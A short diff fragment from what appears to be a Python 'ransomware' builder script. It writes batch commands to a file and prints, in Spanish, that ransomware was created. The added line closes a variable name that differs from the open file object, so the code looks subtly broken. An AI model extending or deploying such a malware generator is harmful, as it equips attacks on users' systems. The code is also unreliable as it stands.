@@ -54,6 +54,7 @@ while True:
                 file. write("start explorer.exe " + os.linesep)
                 file. write("pause" + os.linesep)
                 file. write("exit" + os.linesep)
+                filename.close()
                 print(GREEN+"Ransomware Creado con Exito")
 
                  
